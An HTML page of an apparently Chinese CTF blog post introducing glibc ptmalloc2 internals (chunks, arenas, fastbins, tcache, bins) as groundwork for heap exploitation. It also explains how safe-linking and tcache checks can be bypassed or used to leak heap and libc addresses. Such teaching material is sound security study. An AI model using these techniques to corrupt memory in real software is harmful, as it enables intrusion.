<!DOCTYPE html>
<html lang="zh-CN" color-mode="light">

  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="keywords" content="" />
  <meta name="author" content="arttnba3" />
  <meta name="description" content="あがいた夢を捨てて揺れる今日は眠って誤魔化せ" />
  
  
  <title>
    
      【PWN.0x01】简易 Glibc heap exploit 笔记 
      
      
      |
    
     arttnba3&#39;s blog
  </title>

  
    <link rel="apple-touch-icon" href="/img/favicon.png">
    <link rel="icon" href="/img/favicon.png">
  

  <!-- Raleway-Font -->
  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">

  <!-- hexo site css -->
  
<link rel="stylesheet" href="/css/color-scheme.css">
<link rel="stylesheet" href="/css/base.css">
<link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css">
<link rel="stylesheet" href="/css/github-markdown.css">
<link rel="stylesheet" href="/css/highlight.css">
<link rel="stylesheet" href="/css/comments.css">

  <!-- 代码块风格 -->
  

  <!-- jquery3.3.1 -->
  
    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
  

  <!-- fancybox -->
  
    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
  
  
<script src="/js/fancybox.js"></script>


  

  <script>
    var html = document.documentElement
    const colorMode = localStorage.getItem('color-mode')
    if (colorMode) {
      document.documentElement.setAttribute('color-mode', colorMode)
    }
  </script>
<meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="arttnba3's blog" type="application/atom+xml">
</head>


  <body>
    <div id="app">
      <div class="header">
  <div class="avatar">
    <a target="_blank" rel="noopener" href="https://arttnba3.cn">
      <!-- 头像取消懒加载，添加no-lazy -->
      
        <img src="/img/avatar.png" alt="">
      
    </a>
    <div class="nickname"><a target="_blank" rel="noopener" href="https://arttnba3.cn">arttnba3's blog</a></div>
  </div>
  <div class="navbar">
    <ul>
      
        <li class="nav-item" data-path="/">
          <a href="/">Home</a>
        </li>
      
        <li class="nav-item" data-path="/archives/">
          <a href="/archives/">Archives</a>
        </li>
      
        <li class="nav-item" data-path="/categories/">
          <a href="/categories/">Categories</a>
        </li>
      
        <li class="nav-item" data-path="/tags/">
          <a href="/tags/">Tags</a>
        </li>
      
        <li class="nav-item" data-path="/friends/">
          <a href="/friends/">Friends</a>
        </li>
      
        <li class="nav-item" data-path="/about/">
          <a href="/about/">About</a>
        </li>
      
    </ul>
  </div>
</div>


<script src="/js/activeNav.js"></script>



      <div class="flex-container">
        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->


  <!-- LaTex Display -->

  
    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
  
  <script>
    MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']]
      }
    }
  </script>





  <!-- clipboard -->

  
    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
  
  
<script src="/js/codeCopy.js"></script>







  

  

  

  
  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
  <div class="container post-details" id="post-details">
    <div class="post-content">
      <div class="post-title">【PWN.0x01】简易 Glibc heap exploit 笔记</div>
      <div class="post-attach">
        <span class="post-pubtime">
          <i class="iconfont icon-updatetime" title="更新时间"></i>
          2021-05-10 03:56:56
        </span>
        
              <span class="post-categories">
                <i class="iconfont icon-bookmark" title="分类"></i>
                
                <span class="span--category">
                  <a href="/categories/PWN/" title="PWN">
                    <b>#</b> PWN
                  </a>
                </span>
                
              </span>
          
              <span class="post-tags">
                <i class="iconfont icon-tags" title="标签"></i>
                
                <span class="span--tag">
                  <a href="/tags/Pwn/" title="Pwn">
                    <b>#</b> Pwn
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" title="信息安全">
                    <b>#</b> 信息安全
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/%E5%A0%86/" title="堆">
                    <b>#</b> 堆
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/CTF/" title="CTF">
                    <b>#</b> CTF
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/Use-After-Free/" title="Use After Free">
                    <b>#</b> Use After Free
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/ret2libc/" title="ret2libc">
                    <b>#</b> ret2libc
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/ROP/" title="ROP">
                    <b>#</b> ROP
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/%E5%A0%86%E9%A3%8E%E6%B0%B4/" title="堆风水">
                    <b>#</b> 堆风水
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/got%E8%A1%A8%E5%8A%AB%E6%8C%81/" title="got表劫持">
                    <b>#</b> got表劫持
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/" title="栈迁移">
                    <b>#</b> 栈迁移
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/IO-FILE-hijack/" title="_IO_FILE hijack">
                    <b>#</b> _IO_FILE hijack
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/Fastbin-Attack/" title="Fastbin Attack">
                    <b>#</b> Fastbin Attack
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/FSOP/" title="FSOP">
                    <b>#</b> FSOP
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/Heap-Overflow/" title="Heap Overflow">
                    <b>#</b> Heap Overflow
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/House-of-Botcake/" title="House of Botcake">
                    <b>#</b> House of Botcake
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/House-of-Einherjar/" title="House of Einherjar">
                    <b>#</b> House of Einherjar
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/House-of-Force/" title="House of Force">
                    <b>#</b> House of Force
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/House-of-Husk/" title="House of Husk">
                    <b>#</b> House of Husk
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/House-of-Kiwi/" title="House of Kiwi">
                    <b>#</b> House of Kiwi
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/House-of-Lore/" title="House of Lore">
                    <b>#</b> House of Lore
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/House-of-Orange/" title="House of Orange">
                    <b>#</b> House of Orange
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/House-of-Rabbit/" title="House of Rabbit">
                    <b>#</b> House of Rabbit
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/House-of-Roman/" title="House of Roman">
                    <b>#</b> House of Roman
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/House-of-Spirit/" title="House of Spirit">
                    <b>#</b> House of Spirit
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/House-of-Storm/" title="House of Storm">
                    <b>#</b> House of Storm
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/off-by-one/" title="off by one">
                    <b>#</b> off by one
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/one-gadget/" title="one_gadget">
                    <b>#</b> one_gadget
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/python/" title="python">
                    <b>#</b> python
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/Unlink/" title="Unlink">
                    <b>#</b> Unlink
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/Unsorted-bin-Attack/" title="Unsorted bin Attack">
                    <b>#</b> Unsorted bin Attack
                  </a>
                </span>
                
              </span>
          
      </div>
      <div class="markdown-body">
        <p>不要满足于做一个 ptmalloc 拳击手</p>
<span id="more"></span>

<h1 id="0x00-写在开始之前"><a href="#0x00-写在开始之前" class="headerlink" title="0x00.写在开始之前"></a>0x00.写在开始之前</h1><p>这篇博客其实早在<strong>20年年末</strong>的时候就已经写好了大致的框架，一直想着等哪天完善了再发出来，但是后面一🕊再🕊一直没能够完成，只在博客存档上放了一个<a href="(https://archive.next.arttnba3.cn/2021/02/24/%E3%80%90CTF%E8%B5%84%E6%96%99-0x0002%E3%80%91%E7%AE%80%E6%98%93Linux%E5%A0%86%E5%88%A9%E7%94%A8%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8Bby%20arttnba3/)">半成品</a>，一直想着等有时间了再行补全，却未曾想到越来越忙了，不全的计划却也是遥遥无期，只好稍作修改先扔上来</p>
<p>希望以后有时间能把后面的给补全了罢（🕊🕊🕊）</p>
<blockquote>
<h2 id="第一版引言"><a href="#第一版引言" class="headerlink" title="第一版引言"></a>第一版引言</h2><p>对于堆管理器的利用一直以来都是CTF比赛中的热点，<del>按我的感受来看通常情况下大比赛的签到题都会是一道easy heap</del>，同时由于其知识点的繁复冗杂，对于Linux的堆管理器的利用也是Pwner们的学习路径上的一个瓶颈，因此本人决定将一些基础的套路记录下来，希望能够帮助更多初入pwn世界的萌新们尽快掌握对于堆管理器的美妙利用</p>
<p>当然，本篇博文并不专业，仅仅是记录下了笔者所见过的一些较为常见的利用套路，仅适用于初识堆利用的萌新，对于对堆管理器已经有着一定的了解或者再往上的大师傅们还请无视</p>
<p>本篇仅涉及对于传统 Glibc 中 ptmalloc2 的利用，不包含其他类型堆管理器（如tcmalloc等）的利用手段</p>
</blockquote>
<h2 id="前置知识："><a href="#前置知识：" class="headerlink" title="前置知识："></a>前置知识：</h2><ul>
<li><p>基本的 pwn 知识</p>
</li>
<li><p>x86汇编语言基础</p>
</li>
<li><p>C语言基础</p>
</li>
<li><p>数据结构基础（<strong>笔者个人推荐</strong>至少要Leetcode上的链表题能写中等难度的水平（OI大犇请无视））</p>
</li>
</ul>
<h1 id="0x01-堆内存的分配-amp-释放"><a href="#0x01-堆内存的分配-amp-释放" class="headerlink" title="0x01.堆内存的分配&amp;释放"></a>0x01.堆内存的分配&amp;释放</h1><p>与数据结构中的堆不同，这里我们所说的【堆】指的是进程运行过程中为动态内存分配所服务的内存段，在 Linux 下包括传统的 <code>heap</code> 段 与 <code>Memory Mapping Segment</code> 段，如下图所示（本图来自CTF wiki）：</p>
<p><img src="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/figure/program_virtual_address_memory_space.png" alt="image.png"></p>
<h2 id="堆相关系统调用"><a href="#堆相关系统调用" class="headerlink" title="堆相关系统调用"></a>堆相关系统调用</h2><h3 id="brk"><a href="#brk" class="headerlink" title="brk"></a>brk</h3><p>brk系统调用用以在 heap 段将要耗尽时对其进行拓展，其增长方向为<strong>向高地址增长</strong></p>
<h3 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h3><p>mmap 系统调用用以在内存中映射一块区域，当我们尝试直接分配较大的内存块时 ptmalloc 便会通过 mmap 系统调用在内存中分配一块匿名内存块</p>
<h2 id="内存分配基本思想：重用"><a href="#内存分配基本思想：重用" class="headerlink" title="内存分配基本思想：重用"></a>内存分配基本思想：重用</h2><p>堆管理器处于用户程序与内核中间，主要做以下工作</p>
<ol>
<li>响应用户的申请内存请求。堆管理器负责向操作系统申请内存，然后将其返回给用户程序，但是频繁的系统调用会造成大量的开销。为了保持内存管理的高效性，内核一般都会<strong>预先分配很大的一块连续的内存</strong>，然后<strong>让堆管理器通过某种算法管理这块内存</strong>。只有当出现了堆空间不足的情况，堆管理器才会再次与操作系统进行交互。</li>
<li>管理用户所释放的内存。一般来说，用户释放的内存并不是直接返还给操作系统的，而是由堆管理器进行管理。这些释放的内存可以来响应用户新申请的内存的请求。</li>
</ol>
<h1 id="0x02-堆相关数据结构"><a href="#0x02-堆相关数据结构" class="headerlink" title="0x02.堆相关数据结构"></a>0x02.堆相关数据结构</h1><p><strong>此部分内容推荐阅读：<a target="_blank" rel="noopener" href="https://arttnba3.cn/2021/01/15/NOTE-0X00-MALLOC-2.23-PART-I/"> glibc2.23malloc源码分析 - I：堆内存的基本组织形式 </a>进行深入理解，这里只是帮大家了解个大概的样子</strong></p>
<h2 id="1-chunk"><a href="#1-chunk" class="headerlink" title="1.chunk"></a>1.chunk</h2><p>通常情况下，我们将向系统所申请得到的内存块称之为一个 <strong>chunk</strong></p>
<h3 id="基本结构"><a href="#基本结构" class="headerlink" title="基本结构"></a>基本结构</h3><p>在 ptmalloc2 的内部使用malloc_chunk结构体来表示，代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>各字段含义如下：</p>
<ul>
<li><strong>prev_size</strong>:用以保存前一个内存物理地址相邻的chunk的size，<strong>仅在该chunk为free状态时会被使用到</strong></li>
<li><strong>size</strong>：顾名思义，用以保存这个chunk的<strong>总的大小，即同时包含chunk头</strong>（<strong>prev_size + size</strong>）<strong>和chunk剩余部分的大小</strong></li>
<li><strong>fd</strong>&amp;&amp;<strong>bk</strong>：<strong>仅在在chunk被free后使用</strong>，用以连接其他的chunk，<strong>也就是说当chunk处于被使用的状态时该字段无效，被用以存储用户的数据</strong></li>
<li><strong>fd_nextsize</strong>&amp;&amp;<strong>bk_nextsize</strong>：仅在在chunk被free后使用，用以连接其他的chunk</li>
</ul>
<p>由于最后的两个变量仅用于较大的free的chunk，故我们先暂且忽略</p>
<p>那么我们便可以知道：<strong>一个chunk在内存中大概是长这个样子的</strong>：</p>
<p><img src="https://i.loli.net/2020/12/18/MAmvtL1zrpo9sFV.png" alt="image.png"></p>
<p>其中 prev_size 字段与 size 字段被称之为 chunk header，用以存储 chunk 相关数据，剩下的部分才是系统真正返回给用户进行使用的部分</p>
<h4 id="内存对齐"><a href="#内存对齐" class="headerlink" title="内存对齐"></a>内存对齐</h4><p>宏 <strong>MALLOC_ALIGNMENT</strong> 定义了chunk在内存中对齐的字节数，一般来说算出来都是<strong>对 2 * SIZE_SZ 对齐</strong>，即 <strong>32 位下 8 字节对齐，64 位下 16 字节对齐</strong></p>
<h4 id="标志位定义及相关宏"><a href="#标志位定义及相关宏" class="headerlink" title="标志位定义及相关宏"></a>标志位定义及相关宏</h4><p>我们知道对于一个 malloc_chunk 而言其 size 字段应当与 MALLOC_ALIGNMENT （32 位下为 8 字节，64 位下为16字节）对齐，而在这样的情况下一个 chunk 的 size 字段的低 3&#x2F;4（32&#x2F;64位系统）位将会永远为0，无法得到充分的利用</p>
<p>因此，<del>出于能压榨一点空间是一点空间的思想，</del>一个 chunk 的 <strong>size 字段的低三位用以保存 chunk 相关的三个状态</strong>，代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   --------------- Physical chunk operations ---------------</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* size field is or&#x27;ed with PREV_INUSE when previous adjacent chunk in use */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREV_INUSE 0x1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* extract inuse bit of previous chunk */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> prev_inuse(p)       ((p)-&gt;size &amp; PREV_INUSE)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* size field is or&#x27;ed with IS_MMAPPED if the chunk was obtained with mmap() */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_MMAPPED 0x2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* check for mmap()&#x27;ed chunk */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk_is_mmapped(p) ((p)-&gt;size &amp; IS_MMAPPED)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* size field is or&#x27;ed with NON_MAIN_ARENA if the chunk was obtained</span></span><br><span class="line"><span class="comment">   from a non-main arena.  This is only set immediately before handing</span></span><br><span class="line"><span class="comment">   the chunk to the user, if necessary.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NON_MAIN_ARENA 0x4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* check for chunk from non-main arena */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk_non_main_arena(p) ((p)-&gt;size &amp; NON_MAIN_ARENA)</span></span><br></pre></td></tr></table></figure>

<p>从低位到高位依次如下：</p>
<ul>
<li><strong>PREV_IN_USE</strong>：该chunk<strong>内存物理相邻的上一个chunk</strong>是否<strong>处于被分配状态</strong></li>
<li><strong>IS_MAPPED</strong>：该chunk是否是<strong>由mmap</strong>()<strong>进行内存分配得到的</strong></li>
<li><strong>NON_MAIN_ARENA</strong>：该chunk是否是一个<strong>不属于main_arena的chunk</strong></li>
</ul>
<h4 id="关于chunk间的内存复用及request2size计算相关事项"><a href="#关于chunk间的内存复用及request2size计算相关事项" class="headerlink" title="关于chunk间的内存复用及request2size计算相关事项"></a>关于chunk间的内存复用及request2size计算相关事项</h4><p><del>众所周知·</del>，ptmalloc在组织各chunk时允许一个chunk复用其物理相邻的下一个chunk的prev_size字段作为自己的储存空间，这也是为什么当<strong>一个chunk的物理相邻的前一个chunk处在被分配状态时该chunk的prev_size字段无效</strong>的原因，大致图示如下：</p>
<p><img src="https://i.loli.net/2020/12/19/HZfcpy4wkJGg9V3.png" alt="image.png"></p>
<h3 id="Top-Chunk"><a href="#Top-Chunk" class="headerlink" title="Top Chunk"></a>Top Chunk</h3><p>Top Chunk 是所有chunk中较为特殊的一个 chunk，由于系统调用的开销较大，故一般情况下 malloc 都不会频繁地直接调用 brk 系统调用开辟堆内存空间，而是会在一开始时先向系统申请一个较大的T op Chunk，后续需要取用内存时便从 Top chunk 中切割，直到 Top chunk 不足以分配所需大小的 chunk 时才会进行系统调用</p>
<h2 id="2-arena"><a href="#2-arena" class="headerlink" title="2.arena"></a>2.arena</h2><p>arena这个词直译是“竞技场”的意思，<del>wsm要起这种奇怪的名字我也不知道，可能是因为听起来比较帅气吧</del>，按照笔者的理解，arena 在 ptmalloc2 中用以表示<strong>「单个线程独立维护的内存池」</strong>，这是由于大部分情况下对于每个线程而言其都会单独有着一个 arena 实例用以管理属于该线程的堆内存区域，包括 Bins、Fastbin 等其实都是被放置在arena的结构体中统一进行管理的</p>
<h3 id="main-arena"><a href="#main-arena" class="headerlink" title="main_arena"></a>main_arena</h3><p>main_arena 即**主线程所使用的 arena **，为一个定义于 malloc.c 中的静态的malloc_state结构体，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* There are several instances of this struct (&quot;arenas&quot;) in this</span></span><br><span class="line"><span class="comment">   malloc.  If you are adapting this malloc in a way that does NOT use</span></span><br><span class="line"><span class="comment">   a static or mmapped malloc_state, you MUST explicitly zero-fill it</span></span><br><span class="line"><span class="comment">   before using. This malloc relies on the property that malloc_state</span></span><br><span class="line"><span class="comment">   is initialized to all zeroes (as is true of C statics).  */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> <span class="title">main_arena</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  .mutex = _LIBC_LOCK_INITIALIZER,</span><br><span class="line">  .next = &amp;main_arena,</span><br><span class="line">  .attached_threads = <span class="number">1</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>该arena位于libc中</strong>，而并不似<strong>其他arena一般位于堆区</strong></p>
<p>在堆题中通常通过泄露arena的地址以获得 libc 在内存中的基地址</p>
<h3 id="①fast-bin"><a href="#①fast-bin" class="headerlink" title="①fast bin"></a>①fast bin</h3><p>ptmalloc2 <strong>独立于Bins之外单独设计了一个 Fastbin 用以储存一些 size 较小的闲置 chunk</strong></p>
<ul>
<li>Fastbins 是一个用以保存最近释放的较小的 chunk 的数组，为了提高速度其<strong>使用单向链表进行链接</strong></li>
<li><strong>Fastbin 采取 FILO&#x2F;LIFO 的策略，即每次都取用 fastbin 链表头部的 chunk ，每次释放chunk时都插入至链表头部成为新的头结点</strong>，因而大幅提高了存取chunk的速度</li>
<li><strong>Fastbin 中的 chunk 永远保持在 in_use 的状态，这也保证了她们不会被与其他的 free chunk 合并</strong></li>
<li><strong>malloc_consolidate()函数将会清空 fastbin 中所有的 chunk，在进行相应的合并后送入普通的 bins 中</strong></li>
<li><strong>32位下最大的 fastbin chunk size 为 0x40， 64位下最大的 fastbin chunk size 为 0x80，超过这个范围的 chunk 在 free 之后则不会进入 fastbin 中</strong></li>
</ul>
<h4 id="安全检查"><a href="#安全检查" class="headerlink" title="安全检查"></a>安全检查</h4><h5 id="I-size"><a href="#I-size" class="headerlink" title="I.size"></a>I.size</h5><p>在 malloc() 函数分配 fastbin size 范围的 chunk 时，若是对应的 fastbin 中有空闲 chunk，在取出前会检查其 size 域与对应下标是否一致，<strong>不会检查标志位</strong>，若否便会触发abort</p>
<h5 id="II-double-free"><a href="#II-double-free" class="headerlink" title="II.double free"></a>II.double free</h5><p>在 free() 函数中会对fastbin链表的<strong>头结点</strong>进行检查，若将要被放入 fastbin 中的 chunk <strong>与对应下标的链表的头结点为同一chunk，则会触发abort</strong></p>
<h5 id="III-Safe-linking-机制（only-glibc2-32-and-up）"><a href="#III-Safe-linking-机制（only-glibc2-32-and-up）" class="headerlink" title="III.Safe linking 机制（only glibc2.32 and up）"></a>III.Safe linking 机制（only glibc2.32 and up）</h5><p>自 glibc 2.32 起引入了 safe-linking 机制，其核心思想是<strong>在链表上的 chunk 中并不直接存放其所连接的下一个 chunk 的地址，而是存放下一个 chunk 的地址与【自身地址右移 12位】所异或得的值</strong>，使得攻击者在得知该 chunk 的地址之前无法直接利用其构造任意地址写</p>
<p>需要注意的是<strong>fastbin 的入口节点存放的仍是未经异或的 chunk 地址</strong></p>
<h3 id="②tcache（only-libc2-26-and-up）"><a href="#②tcache（only-libc2-26-and-up）" class="headerlink" title="②tcache（only libc2.26 and up）"></a>②tcache（only libc2.26 and up）</h3><p>Thread Cache(tcache)机制用以快速存取chunk，使用如下结构体进行管理：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">uint16_t</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure>

<ul>
<li>counts：用以存储该 tcache 中每个 entry 中的 chunk 的数量，<strong>glibc2.29 及之前的版本中每个 entry 的 count 都是 char 类型，自 glibc2.30 起改为 uint16_t 类型</strong></li>
<li>entry：用以存储 存放在 tcache 中的 chunk 链表的头节点</li>
</ul>
<p>tcache 中一共有64个 entries ，每个 entries 使用如下结构体进行管理：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure>

<p>即 tcache 中的 chunk 为使用 fd 域连接的单向链表，自 glibc2.29起 使用 bk 域保存 tcache key</p>
<p><strong>tcache 同样采用 FIFO 机制存取 chunk，每个链条上仅能连接 7 个 chunk，当对应的 entry 满了以后再 free 一个 chunk 则会放入 fastbin 或 unsorted bin 中</strong></p>
<p>与普通的 bin 所不同的是，tcache 中空闲 chunk 的 fd 域指向的并非是下一个 chunk 的 prev_size 域，仍是 fd 域</p>
<h4 id="安全保护机制"><a href="#安全保护机制" class="headerlink" title="安全保护机制"></a>安全保护机制</h4><p>tcache 机制刚出来时基本上是毫无保护的，因此对于 tcache 的利用比以往要简单得多（比如说可以直接 double free、任意地址写等</p>
<h5 id="I-tcache-key（only-libc2-29-and-up）"><a href="#I-tcache-key（only-libc2-29-and-up）" class="headerlink" title="I.tcache key（only libc2.29 and up）"></a>I.tcache key（only libc2.29 and up）</h5><p>自 glibc2.29 版本起 tcache 新增了一个 key 字段，该字段位于 chunk 的 bk 字段，<strong>值为 tcache 结构体的地址</strong>，若 free() 检测到 chunk-&gt;bk &#x3D;&#x3D; tcache 则会遍历 tcache <strong>查找对应链表中是否有该chunk</strong></p>
<p>最新版本的一些老 glibc （如新版2.27等）也引入了该防护机制</p>
<h5 id="II-Safe-linking-机制（only-glibc2-32-and-up）"><a href="#II-Safe-linking-机制（only-glibc2-32-and-up）" class="headerlink" title="II.Safe linking 机制（only glibc2.32 and up）"></a>II.Safe linking 机制（only glibc2.32 and up）</h5><p>与 fastbin 的safe-linking 机制相同，这里便不再过多赘叙</p>
<p>不过相比起 fastbin 而言，tcache 的 safe-linking 机制<strong>给了我们新的泄露堆基址的方式</strong>：</p>
<p>我们不难观察到，在 tcache 的一个 entry 中放入第一个 chunk 时，其同样会对该 entry 中的 “chunk” （NULL）进行异或运算后写入到将放入 tcache 中的 chunk 的 <code>fd</code> 字段，若是我们能够打印该 free chunk 的fd字段，<strong>便能够直接获得未经异或运算的堆上相关地址</strong></p>
<p><img src="https://i.loli.net/2021/03/28/cYVZeEbOkf17xhP.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2021/03/28/AQ1P4EeuXRCOyGo.png" alt="image.png"></p>
<p>同时我们注意到，在 tcache-&gt;entry 中存放的<strong>仍是未经加密过的地址</strong>，若是我们能够控制 tcache 管理器则仍可以在不知道堆相关地址时进行任意地址写</p>
<h3 id="③bins数组"><a href="#③bins数组" class="headerlink" title="③bins数组"></a>③bins数组</h3><p>即常规的存放 chunk 的数组，其中存放的 chunk 使用【双向链表】进行连接</p>
<p>专门有着一种叫做 <code>unlink</code> 的机制用以从其中取出 chunk，其中<strong>有着各种各样的安全检查</strong></p>
